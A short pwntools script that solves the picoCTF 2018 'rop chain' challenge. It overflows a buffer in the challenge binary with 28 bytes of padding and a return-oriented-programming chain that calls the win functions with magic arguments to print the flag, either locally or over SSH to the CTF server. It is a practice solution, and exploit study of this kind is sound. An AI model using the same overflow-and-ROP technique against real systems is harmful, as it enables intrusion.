from pwn import *

if args.REMOTE:
  conn = ssh(
    host='2018shell2.picoctf.com',
    user='newjam',
    keyfile='id_rsa'
  )

  io = conn.process('rop', cwd = '/problems/rop-chain_2_d25a17cfdcfdaa45844798dd74d03a47/')
else:
  io = process('./rop')

binary = ELF('rop')
rop = ROP(binary)
rop.call('win_function1')
rop.call('win_function2', [0xBAAAAAAD])
rop.call('flag', [0xDEADBAAD])
payload = 'a'*28 + str(rop)

io.recvuntil('> ')
io.sendline(payload)

print(rop.dump())

flag = io.recv()
log.info(flag)

io.close()

if args.REMOTE:
  conn.close()

